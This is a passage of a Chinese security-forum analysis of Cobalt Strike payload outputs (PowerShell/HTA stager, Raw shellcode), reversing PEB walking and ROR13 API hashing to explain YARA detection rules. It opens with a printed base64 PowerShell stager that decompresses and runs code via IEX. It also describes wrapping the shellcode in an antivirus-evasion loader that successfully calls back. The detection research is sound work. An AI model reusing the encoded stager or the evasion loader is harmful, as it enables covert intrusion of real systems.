HUAMQBoAHIAawAyAHcAdQA0ADIAWABZAE4AOQBzAEIAUwBkAE4AdQBIADIAbgBMAEYAUwBmADcAagBTAHMANwBEAGgAYgBOAE8AcwB0AFYANgB4AHQAaQA5AEEAMQBxAHQANgBTAGgAUwAvAGIAMABWADUANwBSAEYAcAArAEkAMgBiAFAARgB2AG8AOQBCAFYAdQBuAFIAbQBQAGwASABTAEgAcQBaADAASwAxADUAegA3AFQAVgBqADkATwAvAHoAZQA2AE4ARgA2AFoAMQBqADIASgB3AEwASQA2AG4AVABUAEoAVwAxAHQAegB5AEUAeAB0ADAARQBEAE8ASABqAHcARABDAFcAMwBwAGgAagBoAC8AZgBkAGkAVwB3AE4AVgBGADkANABXAGoASQAzAFMAaABKAHEANgBwAEcAaQB0ADUANgBoAGoAUgBDADcAVwBiAEgATwAyAEoANQB5AFEANwBxAC8AbQArACsAUAB1ADAAMQA0AEUANwBlAGIAOABHADQAdQBVAG0ATgBKADQAbABTAFoAYQB1AHQAOQBDAC8ATgBVAFcANgBtAHkAKwBJAGIANQBUAE0AVgA3AHMAYQBuAHMATABSADUAMQBkAHMAeABnAGkASABtAFkAZQBwAGcAdgBtAEUAZgBPAGoAUwArAGwAWQBZAHgANQBtAGkAcwBEAE0AVgBjAEwAcgBtAFoASQBqAC8AbwBsAFYAMgBuAGIARABiAG0AcAAwAHgAbwBiACsAMgBXADgANgBiAFMAVQBaAE0AeQBnAE4ANQBQAGYAdwBSAG4ATwAxAFgASwBZAFUAbABOACsAUwBtAGwAOABYADkAeQByAEkAMwBXAFkAVAB4ADgAZQBpAG8AcABrAHcAdwBqADMARwBGAGwAeABiAC8AOQBCADQAUAA5AGIARgB4AEgAdgBOAFEAZABYAEcAbAB6AEUAaQB2AG0AYgBHADcASwA0ACsAOQA5AFgAbgBxACsAegBsADAAdQB2ADkAdgA1ACsAYQAyAFQAWQBHAHQATQB1ADYAbABlADUAYwB0AFEALwBWAEsAMQBmAE4AVQBDAEsASABzAFUANwAzAGMAWABWAEQARABjAHgAbAB5AHQASQBnAEoARgB3AGIAawBVAG0AMABDAGsAMABhAHIAWABQAHUAKwBjAEQAaQBIAHoAZwA0AHMANABTADkANQA2AFgAdwB0ADEAegBYAFcAZwBXAHoAZABNAHYAdQBoAGoAYwB5AHAAMABhAHIAQgBkADgAUQBTADMAdwBrAEcAbAArAE8AaQBLAEoAZAAwAEgAYwBNAFoAMQBpAE0AaABMAGIATABoAHUATQBjADQAUwBYAFAAdQBzAGkAKwBPAFgATABCAG8AZABYAC8AdwBDAGkARABQAHcAdAAyAHQAVQBKAEsAbQBNAG8AaQBpAHIAKwBXAHgAUgBaACsAWAAxAFkATwBCAGoAawB0AFgAZAB6ADkAYQBMAEIAKwB1AEQASgB4ADUAMwBjAGMAaQBmAHkAagBIADYAVQArAEIANwA0AFAAeQBiAGcAaAAwADMALwBPADcAUQBGAGUARwBXAFAAOQBnADUAZAA2AGQARABuAGUASgBHAFYANgB0AGQASwBSAGIAUwBKAEQALwBPAHgAOAA0AGEALwBRAEUAQgBJAGQARQB2AHUAeABaAGoAcQA2AEgAWQBQAEQAZgB5ADUAVQB0ADYALwB0AFcAdQBkAEoARQBSACsAVABWAHoAcgB4AEgAZgBpAEYAbwBmAFgAaQA1AGsAbQAvAG0AYQBKAHQAawBsAHgARwBSAE8AbgBUADcAQgB2AFIASwBvADcASgA4AFYAdgB4AEEAeQBZAEEATABmAFEAdAB4AEkAMABNAEUAcwBCADcAcQBrAEsAMAA2AFcAUgBRAGgAagBQAC8AUQAxAHYAOQA1AFMATgAwAHcAMABBAEEAQQA9AD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=

进行解压看一下发现确实是 Html Application Powershell 一样的类型：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-bf4a71971d8ee1f48515b493e4cf8d2733267163.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-40d108fc42f2591bd3310c0c7d278fcfebfb493e.png)

那么规则的话也匹配不到了，只能匹配第三阶段，和前面 PowerShell 类型是一样的，可以看出这个 Cobalt Strike 的作者在偷懒啊。

### 特殊的能匹配到的 Raw 类型：

在官网介绍中 Raw 是位置无关的 shellcode，但感觉只是把代码的二进制封装到一个 bin 后缀的文件。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-8d391e5858aa59b7a74556670b05212f885f787b.png)

我们先简单看一下 hex 中的表现，可以看到有常规的通信操作，http 包相关字符串：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-7339c8158b802fd369162b578dc1596eb89ab063.png)  
因为它是要被运行的代码，也就是机器码，所以我们试着转汇编看一下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-a633b577ac5dd5b86cc0b4bf48b1a11c68bffa72.png)

前面有个跳转 CALL -FFFFFF71 ，跟进去看一下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-7968a74eb2aff41d83319d2ab2ba3f931630160c.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-0dd9418ed4f03e6c3e196c2d95cf54615b9942f4.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-188e864dc1b0d22654c10c096921d1657699a683.png)

#### **灵光一闪：**

从这里之后突然灵光一闪，想到了两个点：

1：这里应该是代码和数据放在一起了，上面是代码，下面是数据，所以 User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BO1IE8\_v1;ENUS) 等 http 字样才会在下面：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-fe0b99f6abe4a1cdbfabbc79bc77601b47f22360.png)

2：前面在 "[用 Yara 对红队工具 打标（四）——cobaltstrike 生成马浅析](https://forum.butian.net/share/2070)" 没看出个所以然的 MS Office Macro 的 MyArray 数组中的负数也可以解释了，FC 就是 -4 我是没考虑到 byte 类型的负数并且没转过来，这可能需要写个小脚本才行，如果有大哥知道怎么用 CyberChef 来转请踢我一下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-516d10db05cdfb6b539ce1be5b539c57f7759d7e.png)

#### 尝试匹配 Bin 和 YARA 规则集：

现在来看一下这个匹配到了哪种规则集：  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-de0cfda2c8e042d221263edafa154c6243e9a33d.png)

竟然匹配到了两个，32 位和 64 位分开了，但是匹配到的都是字节码，这样对我们自己的直观性不强，那没办法了，自己分析吧：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-7cbd4af2a29bde5dd251b907a174ba221ed09998.png)

#### shellcode 数组分析

我们先来看看汇编中的代码是什么意思，我们借助 IDA 来看反编译。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-390f3cb259390d8bd871f997769471de91930e34.png)

单纯的没法直接看到，汇编我又不想硬撸，突然想到我可以前面 C 类型举例中有利用一个 CSDN 上拿来的 MSF 的免杀框架，我可以直接把字节码嵌入进去啊！

先写个字节码提取脚本提取成 \\x 形式，这里我不知道有哪个 API 可以直接转成 \\x 形式，像 hex 这些都是 0x 形式的，如果有大佬知道希望踢一踢我：

```python
import os
file_bytes = list()
for a in open("D:\Cobaltstrike_payload\payload64.bin","rb").read():
    file_bytes.append(hex(a).replace("0x","\\x"))
print(''.join(i for i in file_bytes))
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-e1f1cb3fc8b5050a267a90ecc5aa58971d71d3e8.png)

需要注意的是前面C 类型举例中只有 64 位的框架，所以我们读取的字节码也要是 64 位的，现在重新嵌入免杀框架中，生成的 exe 双击运行上线没问题：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-6264819341bb13404ff3f2b9505fba223811df17.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-6b1820cb71e369e6a002d08eba4133ea8242556f.png)

接下来扔入 IDA 中看相关 shellcode 的代码，因为是动态调用，所以我们动调跟进去：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-aeaad5705b4fb2b0ab243d832c17f70324538183.png)

跟进去后发现还存在花指令，动态加载函数等手法，接下来细细分析：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-149b316feb83c7fafbe0ad7e46f48b872c1968a5.png)

##### 根据 PEB 遍历 DLL 名和基址：

以前分析的都是 32 位的，这次由于 CSDN 上搬来的免杀框架是 64 位的，所以只能分析 64 位的了，也算是锻炼自己。\_PEB64 相关的结构体以前没有接触过，所以都得一个个重新查找，分析完后发现和 32 位相差并不大，很多都是相通的。

先来看源代码，在 32 位中 fs 是TEB 的结构指针，64 位中我不知道是不是 gs，因为 IDA 中反汇编出来的结果是 mov rdx, gs:\[rdx+60h\]。而这些 60h、18h、20h 在查找相关结构后发现分别是 TEB——&gt;PEB——&gt;Ldr——&gt;\_PEB\_LDR\_DATA.InMemoryOrderModuleList。说明作者从 InMemoryOrderModuleList 这条链表开始遍历，这条链是根据 DLL 在内存中的位置进行排序的。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-64f956645c84c0c7b86801ea2c1a1830b40bfc2f.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-c010601993fd4363c0079c6b01ead1ec1fbf5f64.png)

然后就是在 InMemoryOrderModuleList 链中获取DLL名及其最大长度(包括末尾的0)：

注意该链表是循环链表，并且 三个 \_LIST\_ENTRY 之间是指向自身的，并不是从头开始的，所以 \[rdx+50h\] 和 \[rdx+4Ah\] 要以 InMemoryOrderModuleList 的位置为起始。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-838f229479a3257c2e3bce05975375e577ee18e0.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-d1e99f34c962f94e04ef0f532c3fefe6b6d550c3.png)

获取到当前 DLL 名和及其长度后进行一个简单的加密操作：循环获取每个字符，转为大写字母，右移 13 位并累加，由此获得了一个自定义算法的 hash 值：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-d623f0dbd6a7e17fbb04edfaaa12b0625f5af707.png)

##### 在遍历的 DLL 基址上获取导出函数名和地址：

前面遍历并计算得到能代表 dll 名的 hash 值后便定位到 DLL 基址处，由此展开 PE 文件格式的操作。

通常在遍历获取导出函数表的函数地址中有两种方法，第一种是根据编号查找函数地址，第二种是根据名字查找函数地址。该项目代码中用的是第二种，具体步骤如下：

> 步骤1 定位到 PE 头。
> 
> 步骤2 从 PE 文件头中找到数据目录表，表项的第一个双字值是导出表的起始 RVA。
> 
> 步骤3 从导出表中获取 NumberOfNames 字段的值，以便构造一个循环，根据此值确定循环的次数。
> 
> 步骤4 从 AddressOfNames 字段指向的函数名称数组的第一项开始，与给定的函数名字进行匹配; 如果匹配成功，则记录从 AddressOfNames 开始的索引号。
> 
> 步骤5 通过索引号再去检索 AddressOfNameOrdinals 数组，从同样索引的位置映射找到函数的地址(AddressOfFunctions)索引。
> 
> 步骤6 通过查询 AddressOfFunctions 指定函数地址索引位置的值，找到虚拟地址。
> 
> 步骤7 将虚拟地址加上该动态链接库在被导入到地址空间的基地址，即为函数的真实入口地址。

回到代码中来验证一下，首先通过不断偏移的手法定位到 \_IMAGE\_OPTIONAL\_HEADER64.Magic 头处，判断句中的 0x20B 指代的是 "PE64"

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-555e45bc744a30bf2524ea2d0089cd775e9f9ad2.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-8e99bdde20087a43e2b288b07660277fbcc96254.png)

接着定位到数据目录表中数据目录项，其第一项就是导出函数表处，获取 NumberOfNames 字段——&gt;以函数名导出函数的个数、AddressOfNames 字段——&gt;函数名称地址表 RVA，准备遍历和获取导出函数名：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-76c116a078ffd7d34bbd5ec33d7c7427fd19ae9b.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-8dd4ab20b95955427bbf761470d8e1871a3067d6.png)

在循环中对于每个获取到的导出函数名都进行同前面动态获取到的 dll 名类似的自定义 hash 计算，右移 13 位并累加，不过这次没有转大写操作：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-141590f88b6c982db0496a45904e0855d7febaf9.png)

最后这里 v15 是前面 dll hash 计算的结果，v12 是这里导出函数名 hash 计算的结果，通过条件句 if ( v15 + v12 == v0 ) 来把 hash 值相加后与预定义值比较，用于确保 dll 和导出函数都是唯一的。都符合之后就走前面提到的步骤 4、步骤 5、步骤 6 来获取该导出函数地址了：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-866d5f4e84951de7263624961e081e362ede4819.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-8f465642681dd05e6b7001a295520ccf80f03567.png)

##### 手法梳理：

该段代码先根据 PEB 结构中 InMemoryOrderModuleList 链获取 DLL 名，然后计算自定义算法的 hash。接着获取该 dll 基址并在 PE 结构操作中遍历导出表中的每个导出函数名，同样的计算其自定义 hash。当两个 hash 相加的值和预定义数匹配时才获取导出函数地址，作者用此来保证获取结果的正确性。

最后进入到一个花指令的跳转 \_\_asm { jmp rax }，这个 rax 就是获取到的动态函数的地址了，也就是获取完后就开始调用了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-75b30b72dad899617c8cf4b5027ac5aba65bc77f.png)

#### 核心 shellcode 数组分析（二）

前面分析的函数以一句话概括为动态加载，是常规的免杀手法，但是调完之后隐约感觉不对劲，比如用于验证准确性的 hash 哪里来？动态获取到函数地址并调用后参数哪里传递的？这些疑问在看到 Google 的规则后才恍然大悟！原来上面的动态加载操作都是作为 shellcode 外层被调用的，而我在调试时一下子步过了没发现！！！！

现在来重新审视外层代码：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-34ab940c643e26fb697f9db46cc41fd170ac4779.png)

然后从前面 call sub\_1E6021C00D2 就来到了这里，这些代码块直接由于加了花指令等干扰，其通过跳转来联系：

（然后我就停在这里了，至于先获取动态那些函数，传入什么参数，怎么调用的，以后有缘再进一步分析。。。）

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-17184c57f49c26f5f7e52a0f2d74a0fa22ad9dd9.png)

#### 重新审视 Bin 和 YARA 规则集：

现在我们可以回过来看看 Google 规则集中的匹配部分了，这里还是以 64 位为例，32 位的同理即可。

第一块找到的对应代码如下，查看 F5 后发现挑选的是自定义 hash 算法部分，前面也说过了该段代码的行为是动态加载调用，这种免杀手法其实也是很常规的，但是作者自定义的 hash 算法确实是一个能作为标志的特征点。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-5cab4bb501045324c0cc502c4072550b4057c886.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-249df6754f9ea7fd1c113131279f1aa232a72b93.png)

第二块找到的对应代码后如下，挑选的是 InternetOpenA 函数的验证 hash，由于 hash 算法是作者自定义的，所以这个验证 hash 也算是一个硬编码。更特别的是其把动态获取函数地址封装成了单个函数来调用，而且是特定的寄存器调用方式，所以这里挑选得完全没有问题。最后看 Google 注释的意思后面的 JMP 是跳转到获取 c2 ip函数处的，手法其实同样是 call rbp 动态获取一个字符串类函数来转换的。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/12/attach-90d6d581873680d8e5621dfa6d97f4e5f653cd24.png)

从上面可以看出常规的动态加载操作 Google 不挑，因为别的恶意软件都有。Google 挑的都是自定义算法相关的逻辑代码或硬编码 hash，确实是明智得很。至于规则中像 44 \[2\] 24 这样哪些汇编应该转成通配符，哪些应该直接写下来，还请看 [用 Yara 对红队工具 "打标"（三）——免杀类规则提取](https://forum.butian.net/share/2008) 的 "汇编中的变与不变"，里面有大致的解释，不过我感觉 Google 的规则还是相对保守了一点，很多寄存器相关的其实可以直接写下来的，也不知道是不是其它不同版本中寄存器也换了，所以 Google 的规则很多只保留了指令部分。

总结：
---

本以为计划往下分析多几个像 Stageless Payload Generator、 Windows Stager Payload 这些的，结果这个 Payload Generator 就让人头疼。先截断在这里，剩下的再慢慢分析。。。。

上面的分析中，如有错误还请指正！

参考：
---

[User-driven Attack Packages (helpsystems.com)](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/init-access_user-driven-attack-packages.htm#_Toc65482753)

[Vergilius Project | Home](https://www.vergiliusproject.com/)

[CobaltStrike使用详解-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/235251#h3-9)

[奇安信攻防社区-用 Yara 对红队工具 "打标"（三）——免杀类规则提取 (butian.net)](https://forum.butian.net/share/2008)

[\[原创\]PEB结构：获取模块kernel32基址技术及原理分析-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com](https://bbs.pediy.com/thread-266678.htm#msg_header_h1_0)